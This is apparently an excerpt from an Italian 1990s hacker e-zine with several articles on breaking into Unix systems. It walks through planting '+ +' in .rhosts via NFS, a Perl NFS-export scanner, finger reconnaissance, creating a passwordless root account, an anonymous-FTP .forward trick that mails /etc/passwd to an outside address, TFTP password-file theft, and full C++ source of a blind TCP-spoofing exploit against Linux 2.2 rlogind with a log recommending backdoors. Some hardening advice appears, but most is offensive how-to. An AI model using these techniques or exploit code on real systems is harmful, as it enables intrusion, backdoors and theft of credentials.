quell'utente ci bastera' creare un file .rhosts nella sua home dir con
all'interno i caratteri "+ +".Quindi:
                
[T0rment0@/mnt/mount]$ echo + +>>jax/.rhosts  

Ed ora usiamo l'utility rlogin per accedere da remoto con il suo login:

[T0rment0@/mnt/mount]$ rlogin -ljax cazz.or.jp

Last login: Sat Oct 16 23:16:36 from altro.cazz.it
Sun Microsystems Inc.   SunOS 5.5       Generic November 1995
>

Ora siamo dentro, digitiamo un ls -al per vedere cosa c'e':

> ls -al
total 8
drwxr-xr-x   2 jax      group        512 Mar  1 17:10 .
drwxr-xr-x  14 jax      group        512 Jan 24 11:16 ..
-rw-r--r--   1 jax      group        144 Dec 30 15:32 .profile
-rw-r--r--   1 jax      bin            8 Mar 11 08:26 .rhosts
>

Con questo accesso potremo fare tante cose, la prima e' prenderci il file
delle password poi .....

Fino a qui va tutto bene, per risparmiarvi tempo, lavoro, fatica e denaro
(ecchecazz) di seguito vi riposto uno script, al quale dovrete passargli come
parametro un file con degli indirizzi, che lancia su ogni indirizzo del file
il comando showmount -e e alla fine salva le informazioni racimolate in un
altro file. Il file con gli indirizzi dovra' essere chiamato domains.
Eccolo qui:
           
================== Inizio di cmount.pl
#!/usr/bin/perl -w
#
# Check NFS exports of hosts listed in file.
# (Hosts are listed, once per line with no additional whitespaces.)
#
# ii@dormroom.pyro.net - 2/27/97.

# Assign null list to @URLs which will be added to later.
my(@result) = ();
my(@domains) = ();
my($program) = "showmount -e ";

# Pull off filename from commandline. If it isn't defined, then assign default.
my($DomainFilename) = shift;
$DomainFilename = "domains" if !defined($DomainFilename);

# Do checking on input.
die("mountDomains: $DomainFilename is a directory.\n") if (-d $DomainFilename);
 
# Open $DomainFilename.
open(DOMAINFILE, $DomainFilename) or 
  die("mountDomains: Cannot open $DomainFilename for input.\n");
  
while (<DOMAINFILE>) {
  chomp($_);
  print "Now checking: $_";

  # Note difference in program output capture from "geturl.pl".  
  open (EXECFILE, "$program $_ |");
  @execResult = <EXECFILE>;
  next if (!defined($execResult[0]));
  if ($execResult[0] =~ /^Export/) {
    print " - Export list saved.";
    open (OUTFILE, ">$_.export");
    foreach (@execResult) {
      print OUTFILE;
    }
    close (OUTFILE);
  }
  close(EXECFILE);
  print "\n";
}
  
# We are done. Close all files and end the program.
close (DOMAINFILE);


================== fine di cmount.pl

Beh vi ho illustrato una delle tante vie dell'hacking e ricordatevi:
"Le vie dell'hacking sono infinite!"
(ndT0rm: tanto alla fine sempre quelle so': phf, sendmail, buffer overflows.:)

                                                                T0rment0

[############################################################################]

------------------------[ - Hacking 127.0.0.1 - ]-------------------------
---------------[ Fatelo voi prima che ci pensino gli altri ]--------------
-------------------------------[ Parte 1 ]--------------------------------

Bene. A nessuno di voi e' mai venuto in mente che un hacker non e' altro che 
una persona che conosce il TCP/IP meglio del corpo della sua gnocca? No? 
Pensate che un hacker sia un ragazzino di 16 anni che invece di pensare alla 
scuola passa le sue nottate , e il suo tempo libero e la sera davanti al suo pc
annotando tutte le possibili combinazioni di login & passwd su di un pezzettino
di carta preso dalla smania di riuscire di dimostrare chissa' cosa a qualcuno? 
Sinceramente non e' questa la sede per discutere di questo. =]
Qui tratteremo della filosofia "Se vuoi prevenire un hacker, devi pensare come 
un hacker", per rendere piu' sicuro il vostro sistema . 
Premetto che un sistema sicuro all 100% non esiste. Quelli che seguono vogliono 
solo essere dei consigli per essere piu' sicuri quando si ha un sistema Unix 
collegato in rete. Dico Unix perche' girare per la rete con Windows e' piu' 
sicuro. Non ridete. Windows non offre tutti i servizi che offre un sistema 
Unix, che ha un miriade di server da offrire per un possibile attacco. 
Windows non ha finger, non ha una 25, non ha di default un server ftp, 
un telnet, windows non ha un ca$$. Questo testo e' indirizzato quindi 
principalmente ad un Sysadmin, o a chiunque voglia migliorare la sicurezza 
del suo sistema guardando le cose da un punto di vista di chi invece vuole 
penetrare il sistema, avvalendosi della -scarsa- sicurezza del suddetto. 
Sia chiaro che in nessun modo qui si vuole 
incoraggiare a "bucare" i sistemi degli altri, ma solo il proprio, per 
valutarne l'effettiva vulnerabilita'.
Per fare cio' ci avvaleremo di tutti i "tools", gli strumenti utilizzati da 
chi attacca i sistemi, incluso SATAN [ Security Analysis Tool for Auditing 
Networks ] , e poi programmi che i sistemi *nix hanno di default. Ovviamente 
ci saranno molti metodi per entrare in un sistema, ma qui ne tratteremo solo 
alcuni.
E' ovvio che la sicurezza del sistema dipende da COSA si deve tenere
al sicuro, stara' poi al Sysadmin decidere.

[ Conosci te stesso ...e non rompere il cazzo a me - Kipli ]

[FINGER]

Come primo passo dobbiamo avere quante piu' informazioni possibili per quanto 
riguarda il sistema oggetto del nostro attacco. Ed ecco che entra in gioco il 
piu' avanzato dei tools esistenti su qualsiasi server ftp: Il nostro cervello.
Partendo da questo tool, dovremo ingegnarci per avere quante piu' info 
possibili, iniziando dai comandi di default come finger, showmount e rpcinfo,
ma anche DNS, whois, sendmail, ftp, uucp e tutti gli altri servizi reperibili
sulla macchina. Iniziamo con finger:

victim % finger @victim.com
 [victim.com]
 Login       Name             TTY Idle     When    Where
 zen      Dr.  Fubar           co   1d  Wed 08:00   death.com

Sembra che ci sia un solo utente. Questo rendera' piu' facile la vostra
missione, non essendovi molte persone a guardare quello che succede.
Potete utilizzare finger anche con altri servizi provate bin, root, ftp...
(es: finger nobody@host.vittima vi da informazioni specifiche per l'utente
nobody e cosi' via come per finger root@host.vittima ecc ecc...)
Ecco cosa potrebbe capitarvi con queste info:

 Login   Home-dir    Shell      Last login, from where
 -----   --------    -----      ----------------------
 root    /           /bin/sh    Fri Nov 5 07:42 on ttyp1 from victim.com
 bin     /bin                   Never logged in
 nobody  /                      Tue Jun 15 08:57 on ttyp2 from server.host.
 daemon  /                      Tue Mar 23 12:14 on ttyp0 from big.victim.com
 sync    /           /bin/sync  Tue Mar 23 12:14 on ttyp0 from big.victim.com
 zen     /home/zen   /bin/bash  On since Wed Nov  6 on ttyp3 from death.com
 sam     /home/sam   /bin/csh   Wed Nov  5 05:33 on ttyp3 from evil.com
 guest   /export/foo /bin/sh    Never logged in
 ftp     /home/ftp              Never logged in

Finger e' molto utile per le informazioni che volete avere su di un sistema.
Le informazioni che otterrete saranno anche in base alla versione del finger
che gira su quella macchina. Sarebbe utile trovare qualche utente inutilizzato
da tempo, account temporanei dimenticati le cui password sono semplici.
Per questo motivo e' bene disabilitare il fingerd sul vostro sistema.

Altre informazioni (questa volta sui filesystem) condivisi attraverso il 
protocollo NFS (Network File System) possono essere ottenute attraverso il 
comando showmount.

[SHOWMOUNT]

think@debian:~$ showmount -e host.vittima

 export list for host.vittima:
 /export                            (everyone)
 /var                               (everyone)
 /usr                               easy
 /export/exec/kvm/sun4c.sunos.4.1.3 easy
 /export/root/easy                  easy
 /export/swap/easy                  easy

Dalle informazioni precedenti piu' queste dateci dallo showmount notiamo
che la directory /export/foo e' esportabile a tutti, ed e' anche la dir 
dell'utente guest! In questo caso mounterete la home directory di "guest"
Poi creerete un account "guest" nel vostro file locale di passwd. Come utente
guest potrete poi mettere nella directory un file .rhosts che vi permettera' 
di effettuare un login senza bisogno di password:

 evil # mount victim.com:/export/foo /foo
 evil # cd /foo
 evil # ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
 evil # echo guest:x:10001:1:temporary breakin account:/: >> /etc/passwd
 evil # ls -lag
 total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
 evil # su guest
 evil % echo evil.com >> guest/.rhosts
 evil % rlogin victim.com
         Welcome to victim.com!
 victim %

Se poi invece e' possibile esportare directory come /usr/bin allora potreste
cambiare gli eseguibili con dei troiani, in modo che al momento di accedervi
l'utente li esegua senza saperlo. 
Per questo e' consigliabile mettere in modalita' read-write filesystem 
esportabili solo a determinati e sicuri domini specifici, il resto andra' 
in read-only.
Se poi il sistema ha un "+" nel suo /etc/hosts.equiv , ogni utente puo' 
effettuare un rlogin (ammesso che esso sia in /etc/passwd) senza bisogno di 
alcuna password. Quindi la prossima mossa potrebbe essere quella di effettuare 
il login con "bin" che di solito possiede sia i programmi che directory, 
per poi modificare il file /etc/passwd ed ottenre accesso root:

evil % whoami
 bin
 evil % rsh victim.com csh -i
 Warning: no access to tty; thus no job control in this shell...
 victim %  ls -ldg /etc
 drwxr-sr-x  8 bin      staff        2048 Jul 24 18:02 /etc
 victim %  cd /etc
 victim %  mv passwd pw.old
 victim %  (echo toor::0:1:instant root shell:/:/bin/sh; cat pw.old ) > passwd
 victim % ^D
 evil % rlogin victim.com -l toor
	 Welcome to victim.com!

rsh victim.com csh -i e' usato perche' non lascia tracce nei file wtmp e utmp.

[FTP]

Un altro modo per verificare la sicurezza del vostro sistema e' via ftp. 
Sempre col finger magari avete notato un account "ftp". In genere significa 
che e' abilitato l'accesso "anonymous" al server ftp in questione. Cio' 
significa che chiunque puo' accedervi senza bisogno di una particolare 
password. L'utente che vi accede , in effetti ha di fronte a se la directry 
~ftp . E' come se fosse in un minifilesystem. Questo comprende ovviamente 
anche directory ed eseguibili. Esiste in particolare un file : /ftp/etc/passwd. 
Questo non dovrebbe essere una copia esatta di /etc/passwd, , ma una versione 
ridotta, ma comunque utile per ottenere info...figuriamoci se fosse la copia 
esatta di /etc/passwd !
(de hi hi)

Ecco cosa potrebbe succedere in una sessione di ftp anonimo:
L'utente anonimo potrebbe creare un file per il forward in modo da farsi 
spedire il file /etc/passwd sulla sua casella di email:

evil % cat topolino
"|/bin/mail lame@lameland.com < /etc/passwd"

evil % ftp victim.com
 Connected to victim.com
 220 victim FTP server ready.
 Name (victim.com:zen): ftp
 331 Guest login ok, send ident as password.
 Password:
 230 Guest login ok, access restrictions apply.
 ftp> ls -lga
 200 PORT command successful.
 150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
 total 5
 drwxr-xr-x  4 101      1             512 Jun 20  1991 .
 drwxr-xr-x  4 101      1             512 Jun 20  1991 ..
 drwxr-xr-x  2 0        1             512 Jun 20  1991 bin
 drwxr-xr-x  2 0        1             512 Jun 20  1991 etc
 drwxr-xr-x  3 101      1             512 Aug 22  1991 pub
 226 ASCII Transfer complete.
 242 bytes received in 0.066 seconds (3.6 Kbytes/s)
 ftp> put topolino .forward
 43 bytes sent in 0.0015 seconds (28 Kbytes/s)
 ftp> quit
 evil % echo test | mail ftp@victim.com (questo vi fara' recapitare il file 
 /etc/passwd direttamente a casa vostra senza nemmeno pagare le spese di 
 spedizione e gli interessi in comode rate :P)

Inoltre ci sono dei bug secondo i quali si puo' ottenere accesso root tramite 
ftp, i metodi piu' sicuri per stare lontani da lacune di bug di programmi e ' 
- ovviamente - aggiornarsi continuamente e aggiornare i programmi, quindi 
se avete una versione molto vecchia di ftpd e' probabile che dobbiate cambiarlo 
con una versione piu' aggiornata, o patcharlo.

Se volete proprio tenere attivo il servizio FTP anonimo vi conviene rendere 
la directory di proprieta' del solo "ftp" account e di renderla inscrivibile 
a tutti:

# chown ftp ~ftp
# chmod 555 ~ftp

Fate in modo che la directory ~ftp/bin sia accessibile solo al root, e che 
sia non-scrivibile da parte di tutti gli altri, inoltre mettete una copia di 
ls in questa dir.

# mkdir ~ftp/bin
# chown root ~ftp/bin
# chmod 555 ~ftp/bin
# cp -p /bin/ls ~ftp/bin
# chmod 111 ~ftp/bin/ls

Fate lo stesso con ~ftp/etc , inoltre lasciate nel file delle password 
gli account e sostituite le password con degli asterischi, potreste essere 
tentati di cancellare tutto, ma qualche account ci deve pur rimanere , 
almeno quello "ftp".

# mkdir ~ftp/etc
# chown root ~ftp/etc
# chmod 555 ~ftp/etc
# cp -p /etc/passwd /etc/group ~ftp/etc
# chmod 444 ~ftp/etc/passwd ~ftp/etc/group

Rendete la directory ~ftp/pub dell'account "ftp" con chown in piu' create la 
directory pub e rendetela scrivibile a tutti, servira' per lo scambio dei files.

# mkdir ~ftp/pub
# chown ftp ~ftp/pub
# chmod 777 ~ftp/pub

[ Piccolo bignami dell'ftp ] :
(molti dei comandi come ls e cd non li metto perche' dovreste gia' sapere a 
cosa servono, se non lo sapete state leggendo il file sbagliato :P)
FTP (File Transfer Protocol) e' il protocollo attraverso il quale si mandano 
e ricevono dati. Come il Telnet, il client FTP puo' essere invocato dal 
semplice comando "ftp".

% ftp -n HOST

L'opzione -n disabilita l'auto-login e il net-trace che manda il login di 
chi effettua il comando insieme al nome del sistema. Il prompt che si 
presenta e':

ftp>

open HOST
Stabilisce una connessione con l'host

close
Termina la connessione e torna al "command mode" in attesa di input

quit
Chiude il programma

status
Mostra informazioni

! COMMAND
Mostra aiuto sul comando scelto COMMAND.

lcd DIRECTORY
Cambia la directory locale in DIRECTORY, quella scelta da noi.

get REMOTE_FILE LOCAL_FILE
Riceve il REMOTE_FILE dal pc remoto e lo rinomina LOCAL_FILE sul nostro pc.   

send LOCAL_FILE REMOTE_FILE
Stessa cosa di prima ma si manda.

append LOCAL_FILE REMOTE_FILE
Attacca il LOCAL_FILE alla fine del file remoto REMOTE_FILE

rename REMOTE_FILE NEW_REMOTE_FILE
delete REMOTE_FILE

[TFTP]

Inoltre esiste il tftp (Trivial File Transfer Protocol) che non necessita di
autenticazione di alcun genere poiche' e' stato originariamente pensato per 
i sistemi DiskLess (una volta nessuno pensava che glielo avrebbero messo 
nel...ehm...nella backdoor :P c'era il concetto di fiducia, di trust.)

Un ipotetico hacker potrebbe benissimo avere accesso a tutto il disco, via tftp.
Nell'esempio riportato si prende letteralmente il file di password remoto:

evil % tftp
 tftp> connect victim.com
 tftp> get /etc/passwd /tmp/passwd.victim
 tftp> quit

Per essere sicuri , non dovreste proprio attivare questo servizio, o se lo 
fate settate bene i permessi delle directory. Ecco cosa potete fare per 
controllare tftp sul vostro saistema:

% tftp
tftp> connect yourhost
tftp> get /etc/motd tmp
Error code 1: File not found
tftp> quit
%

Se il sistema non risponde "file not found" ma bensi' lo trasferisce, 
cambiate subito versione del programma.

Nella seconda parte dell'articolo:

RCPINFO
SENDMAIL
X - Window
rlogin
...ed altro


Bibliografia:
Improving the Security oF Your Site by Breaking Into it - Dan Farmer
An Architectural Overview of UNIX Network Security - Robert B. Reinhardt
Appunti Linux - Daniele Giacomini
The Networked UNIX:TCP-IP - SOLID STATE (LOD)
IMPROVING THE SECURITY OF YOUR UNIX SYSTEM - David A. Curry

                                                                  \think\      

[############################################################################]
               
----------------[ VULNERABILITA' DELL'ISN DEI KERNEL DI LINUX ]----------------

Sommario
===================

    Un'imperfezione implementata nello stack TCP dei kernel 2.2.x di Linux
    e' stata scoperta. La vulnerabilita' rende possibile delle connessioni
    TCP spoofate.
    E' quindi possibile per un hacker inizializzare una connessione TCP 
    da un indirizzo IP sorgente arbitrario o non esistente, exploitando
    il meccanismo di accesso basato sul controllo dell'indirizzo IP.

    I kernel di serie 2.0.x non sono vulnerabili a questo attacco in ogni
    caso. Di solito si dice che il progresso porta migliorie...beh in questo
    caso ci dobbiamo ricredere :pppp


Sistemi Infetti 
===================

    Tutti i sistemi che eseguono Linux con il kernel di serie 2.2.x .
    I sistemi Linux 2.3.x possono essere infetti, non abbiamo provato
    questa versione.

    Nel nostro test riscontriamo che non sembra avere importanza se
    i syncokkie siano funzionali o meno (abilitati assieme al kernel
    e attivati attraverso l'opzione del filesystem proc).


Test
===================

    Questo e' l'inizio di un log di un attacco di TCP spoofing contro un
    sistema avente Linux con kernel 2.2.12

    (derivato da una schermata formattata di tcpdump per una corretta lettura)

    16:23:02.727540 attacker.522  > victim.ssh  : S  446679473: 446679473(0)
    16:23:02.728371 victim.ssh    > attacker.522: S 3929852318:3929852318(0)
    16:23:02.734448 11.11.11.11.522 > victim.ssh: S  446679473: 446679473(0)
    16:23:02.734599 victim.ssh > 11.11.11.11.522: S 3929859164:3929859164(0)
    16:23:03.014941 attacker.522  >   victim.ssh: R  446679474: 446679474(0)
    16:23:05.983368 victim.ssh > 11.11.11.11.522: S 3929859164:3929859164(0)
    16:23:06.473192 11.11.11.11.522 > victim.ssh: . ack 3929855318
    16:23:06.473427 victim.ssh > 11.11.11.11.522: R 3929855318:3929855318(0)
    16:23:06.554958 11.11.11.11.522 > victim.ssh: . ack 3929855319
    16:23:06.555119 victim.ssh > 11.11.11.11.522: R 3929855319:3929855319(0)
    16:23:06.637731 11.11.11.11.522 > victim.ssh: . ack 3929855320
    16:23:06.637909 victim.ssh > 11.11.11.11.522: R 3929855320:3929855320(0)
    ...

    Il primo ISN dell'host della vittima e' 3929852318, che e' insieme ad un
    pacchetto SYNACK all'host che attacca. Questo non e' ancora spoofato e
    puo' esere facilmente strappato dall'attaccante.
    Nello stesso tempo l'attaccante invia il primo pacchetto SYN non spoofato
    e ancora un pacchetto SYN spoofato da 11.11.11.11 .
    Questo pacchetto viene risposto dall'host vittima ancora con l'ISN
    3929859164. La differenza tra il primo visibile ISN e il secondo ISN e'
    solo (3929859164-3929852318) = 6846.

    Se ci fate caso tutti i parametri TCP e IP del pacchetto spoofato, eccetto
    per l'indirizzo IP sorgente sono gli stessi di un pacchetto non spoofato.
    Questo e' importante (vedi dopo).

    Questa piccola differenza assieme alla sequenza numerica iniziale TCP
    (ISN) e' exploitabile. Negli altri test, dove entrambi gli host erano
    non laggati abbiamo sempre avuto una differenza che va oltre i 500.

    Si e' riuscito a gestire con successo delle connessioni tcp spoofate su 
    differenti sistemi con Linux di serie 2.2.x, che ci hanno dato lo stato
    TCP "ESTABLISHED" senza sniffare l'host vittima.


Impatto
===================

    Spedendo i pacchetti da un vero indirizzo sorgente, gli hackers
    potrebberero bypassare il meccanismo di sicurezza basato
    sull'autenticazione dell'indirizzo.

    Ci sono state tecniche di exploit simili, usate specialmente per r* e
    per i servizi NFS, in passato si era gia' dimostrato molto bene che
    risvolti potevano avere gli ISN per la sicurezza.

    E' stato scritto un exploit funzionante per dimostrare il problema.


Spiegazione
===================

    Il problema si basa su un'opzione implementata assieme all'algoritmo per
    la creazione di ISN random nel kernel di linux.

    Il problema e' dentro drivers/char/random.c, line 1684:

    __u32 secure_tcp_sequence_number(__u32 saddr, __u32 daddr,
                                     __u16 sport, __u16 dport)
    {
            ...
            static __u32    secret[12];
            ...
            secret[0]=saddr;
            secret[1]=daddr;
            secret[2]=(sport << 16) + dport;

            seq = (halfMD4Transform(secret+8, secret) &
                   ((1<<HASH_BITS)-1)) + count;
            ...
    }

    Come gia' detto, nel nostro pacchetto SYN spoofato solo l'indirizzo IP
    sorgente differisce, e' solo secret[0], cosi' dei 12*4 bytes random usati
    per creare la sequenza di numeri, solo 4 bytes differiscono.
    Ovviamente il miscuglio creato da halfMD4Transform ha similiarita' se il
    sorgente e le porte e gli indirizzi di destinazione coincidono.

    Sembra che l'indirizzo sorgente e' il meno significante del suddetto
    algoritmo MD4. Cambiando anche le porte sorgenti, fa che i 2 ISN
    differiscano.  Dovuto ad una piccola breccia di tempo, l'ultimo

            seq += tv.tv_usec + tv.tv_sec*1000000;

    e' inutile. Puo' essere il motivo di perche' questo bug puo' avere vita
    lunga: in ogni situazione di network reale e' raro che la porta sorgente
    e la porta di destinazione sono uguali i due connessioni differenti su un
    host.

    Un'ulteriore analisi dell'algoritmo del miscuglio in questa routine puo' 
    risultare una piccola predizione dell'ISN piu' di una che usiamo
    (predizione di range).


Soluzione
===================

   Primo: E' sempre imprudente fidarsi del meccanismo basato
          sull'autenticazione dell'indirizzo, perche' in un ambiente
          sniffabile, come internet, ci sono sempre possibilita' di
          bybassarlo.

   Secondo: La pressione non puo' farci pensare questo come _THE_ Linux bug.. 
            ognuno che ha visto la sequenza di numeri ISN di ogni sistema
            operativo Microzoft conosce che i loro 'numeri casuali' sono
            obiettivi di spoofing molto facili. Per una descrizione di come
            i numeri ISN dello stack TCP di Microzoft Windows NT hanno poi 
            indebolito con l'ultimo service pack, dovrete andare su buqtraq
            e controllare gli ultimi posting.
            Bene.. non quello e' il motivo.. ma chi usa software Microsoft
            in ogni caso ?

    Gli sviluppatori del kernel di linux sono stati avvisati nello stesso
    tempo della comunita' di linux, cosi' una patch potra' essere disponibile
    molto presto.


Conoscenze
================

    Gli scopritori di questo bug e dell'exploit sono:

    Stealth    http://www.kalug.lug.net/stealth
    S. Krahmer http://www.cs.uni-potsdam.de/homepages/students/linuxer

 

Exploit
===================

    E' stato creato un exploit funzionante per dimostrare la vulnerabilita'.
    L'exploit richiede la librerie libUSI++ installata, che si puo' scaricare su:

       http://www.cs.uni-potsdam.de/homepages/students/linuxer/
       
    Ecco invece il codice sorgente dell'exploit per linux:

------COMINCIA A TAGLIARE------blindSpoof.cc------

/*** Exploit for the 2.2 linux-kernel TCP/IP weakness.
 *** (C) 1999 by S. Krahmer. 
 *** THERE IS ABSOLUTELY NO WARRANTY. YOU USE IT AT YOUR OWN RSIK!
 *** THIS PROGRAM IS LICESED UNDER THE GPL and belongs to a security-
 *** advisory of team teso. You should get the full advisory with paper
 *** on either 
 *** http://www.cs.uni-potsdam.de/homepages/students/linuxer or
 *** http://teso.scene.at
 ***
 *** The bugdiscovery and the exploit is due to:
 ***
 *** Stealth	http://www.kalug.lug.net/stealth
 *** S. Krahmer http://www.cs.uni-potsdam.de/homepages/students/linxuer
 ***
 *** c++ blindSpoof.cc -lusi++ -lpcap	(this is LINUX source!)
 *** Libusi++ is available on my homepage.
 *** Achtung: Gehen Sie nicht in den 100 Meilen tiefen Wald! ;-)
 ***/
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <usi++/usi++.h>

#define XPORT 513

// may be changed, my best results were around 2000,
// but also diffs of > 5000 can happen :)
// change it it really not works
#define MAXPACK 3000

// define this if you want to exploit rlogind
// if not, you will just spoof a connection to XPORT
#define EXPLOIT_RLOGIND 

// uses eth0 for packet-capturing!
TCP *pingVictum(char *, char *, char *);
int printInfo(TCP *);
bool wrongPacket(TCP *, TCP *);

int main(int argc, char **argv)
{
	// yes, script-kidz! this is hardcoded to prevent you from usage.
	const char *remoteUser = "stealth",
	           *localUser  = "stealth",
		   *command    = "echo liane root>>~/.rhosts\n";
	char sbuf[1000];
	
	if (argc < 4) {
		printf("Usage %s [destination-IP] [source-IP] [spoofed-IP]\n", argv[0]);
		exit(1);
	}
	cout<<"blindSpoof-exploit by S. Krahmer\n"
	      "http://www.cs.uni-potsdam.de/homepages/students/linuxer\n\n";	
	// would be connect() 
       	TCP *conn = pingVictum(argv[1], argv[2], argv[3]);

#ifdef EXPLOIT_RLOGIND
	conn->set_flags(0);
	sprintf(sbuf, "\0");
	conn->sendpack(sbuf, 1);
	sleep(1);
	
	cout<<"Sending local username: "<<localUser<<endl;
	
	// send local username
	conn->set_seq(conn->get_seq() + 1);
	memset(sbuf, 0, 1000);
	snprintf(sbuf, sizeof(sbuf), "%s\0", localUser);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	
	// we don't know about the lag, so i hope that 7 in sec.
	// the victum has sent an ACK
	sleep(7);
	
	cout<<"Sending remote username: "<<remoteUser<<endl;
	
	// send remote username
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", remoteUser);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	sleep(7);
	
	cout<<"Sending terminal-type and speed.\n";
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", "linux/38400");
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	sleep(7);
	
	
	cout<<"Sending command: "<<command<<endl;
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", command);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
#else
	cout<<"Connection to port "<<XPORT<<" should be established.\n";
#endif
	delete conn;
	return 0;
}

/* Spoof a connection. */
TCP *pingVictum(char *host, char *src, char *spoofed)
{
	char buf[100];
        TCP *victumLow = new TCP(host),
	    *victumSpoofed = new TCP(host),
	    *sn = new TCP(host);    
        int myISN = rand(), sport = 512 + rand()%512;
        
        sn->init_device("eth0", 1, 500);

        victumLow->set_flags(TH_SYN);
     	victumLow->set_dstport(XPORT);	// rlogin
        victumLow->set_srcport(sport);	// from a privileged port
        victumLow->set_src(src);                
    	victumLow->set_seq(myISN);
		
        victumSpoofed->set_flags(TH_SYN);
     	victumSpoofed->set_dstport(XPORT);	
        victumSpoofed->set_srcport(sport);	
        victumSpoofed->set_src(spoofed);
	victumSpoofed->set_seq(myISN);		// we must save the ISN
	
	// send SYN to get low end of ISN
	victumLow->sendpack("");
		
	// send spoofed SYN 
        victumSpoofed->sendpack("");
	
	cout<<"Using sourceport "<<victumSpoofed->get_srcport()<<endl;
	
	// wait for SYN/ACK of low packet
	while (wrongPacket(sn, victumLow)) {
           	sn->sniffpack(buf, 100);
                printf("%s:%d -> %s:%d ", sn->get_src(1), sn->get_srcport(),
		                          sn->get_dst(1), sn->get_dstport());
                printInfo(sn);
        }
	int lowISN = sn->get_seq();		
	sleep(2);
	
	// NOTE! Even if we sent the SYN before the spoofed SYN, the
	// spoofed SYN can arrive first, due to routing reasons.
	// Althought this is NOT very likely, we have to keep it in mind.
	cout<<"Low end: "<<(unsigned)lowISN<<"\n";	
        victumSpoofed->set_flags(TH_ACK);
    	victumSpoofed->set_seq(myISN + 1);

	// 	
        for (int i = lowISN; i < lowISN + MAXPACK; i++) {
                victumSpoofed->set_ack(i);
                victumSpoofed->sendpack("");
		printf("%u\r", i); fflush(stdout);
		// maybe you have to place a usleep() here, depends on
		// your devices
        }
	cout<<endl;
	delete sn;
        delete victumLow;
	
	// from now, the connection should be established!
	return victumSpoofed;
}


// give out some infos about the received packet
int printInfo(TCP* r)
{
	cout<<"[flags: ";
	if (r->get_flags() & TH_FIN)
		cout<<"FIN ";
	if (r->get_flags() & TH_SYN)
		cout<<"SYN ";
	if (r->get_flags() & TH_RST)
		cout<<"RST ";
	if (r->get_flags() & TH_PUSH)
		cout<<"PUSH ";
	if (r->get_flags() & TH_ACK)
		cout<<"ACK ";
	if (r->get_flags() & TH_URG)
		cout<<"URG ";
	cout<<"] [ACK: "<<r->get_ack()<<"] [SEQ: "<<r->get_seq()<<"]"<<endl;
	return 0;
}

/* returns true is packet is WRONG
 */
bool wrongPacket(TCP *p1, TCP *p2)
{
   	if (p1->get_src() != p2->get_dst())
           	return true;
        if (p1->get_dst() != p2->get_src())
           	return true;
        if (p1->get_dstport() != p2->get_srcport())
           	return true;
        if (p1->get_srcport() != p2->get_dstport())
           	return true;
        if (p1->get_ack() != (p2->get_seq() + 1))
           	return true;
        return false;
}

------CAZZ SMETTI DI TAGLIARE------


Log
===================

Vediamo un log di un uso dell'exploit su un host vulnerabile.
Proviamo a fare prima un rlogin per vedere se indoviniamo la password a culo!
Pero' prima facciamo finta che la struttra di questa rete sia:
                        __________
                       | INTERNET |
                      /------------\
             __________             _________
            |          |           |         |
            | T0RMENT0 | <-------> | LUCIFER |
            |__________|           |_________|

Il dominio e' lo stesso per tutti e' due i pc (c-skills.de)
Ora proviamo a fare un rlogin su l'altra macchina con l'user stealth:

[root@T0rment0 /root]# rlogin -l stealth lucifer
Password:
Password:
^D

Login incorrect
rlogin: connection closed.

Eh no! Non sono mai stato fortunato! :( Vabbe' meno male che questo bug
mi salva le chiappe :) Allora, ora lo compiliamo prima (aspe? la avete
scaricata la libreria? no??? e a chi aspettate?):

[root@T0rment0 /root]# !c+
c++ blindSpoof.cc  -lusi++ -lpcap

Siccome sono molto pigro non gli ho dato un nome, quindi ora il file
eseguibile sara' a.out nella directory corrente. Per farlo funzionare
dovrete specificare 3 argomenti. Il primo e' l'host obiettivo ovvero quello
che ha il kernel 2.2.X installato. Il secondo e' il nome dell'host sorgente
(qui ci vuole l'indirizzo vero altrimenti non ricevete risposte dal server)
Il terzo argomento, invece, e' l'host per il quale vorreste farvi scambiare.
Tutto bene! Eseguiamo:

[root@T0rment0 /root]# ./a.out lucifer T0rment0 alice
blindSpoof-exploit by S. Krahmer
http://www.cs.uni-potsdam.de/homepages/students/linxuer

Using sourceport 996
T0rment0.c-skills.de:996 -> lucifer.c-skills.de:513 [flags: SYN ] [ACK: 1709299065] [SEQ: 642221920]
alice:996 -> lucifer.c-skills.de:513 [flags: SYN ] [ACK: 1709299065] [SEQ: 642221920]
lucifer.c-skills.de:513 -> T0rment0.c-skills.de:996 [flags: SYN ACK ] [ACK: 642221921] [SEQ: 3072739429]
Low end: 3072739429
3072742428
Sending local username: stealth
Sending remote username: stealth
Sending terminal-type and speed.
Sending command: echo T0rment0 root>>~/.rhosts

Come vedete ho dato stealth come user e l'ho aggiunto in .rhosts visto che
sono su un server con IP statico ma nel vostro caso consiglio di inserire un
bel echo ++>>~/.rhosts che poi dovrete togliere una volta creatovi il vostro
bell'user e la vostra bella backdoor :)
Bene ora riproviamo con rlogin su l'host lucifer con l'user che abbiamo
passato all'exploit ovvero stealth.
    
[root@T0rment0 /root]# rlogin -l stealth lucifer
Last login: Sat Sep 25 16:17:50 from alice
You have mail.
lucifer:[stealth]>

Funziona! (ndSimp: Shell...hmmmmmmmmmmmmmm! Sluuurppp! Miiiitiiiicooo!)
Arrivedergliele a tutti e buon hacking :)

                                                                     T0rment0

[############################################################################]

                  ---------------------------------------- 
                        NUOVE VULNERABILITA' DEL CGI
                  ----------------------------------------
                        
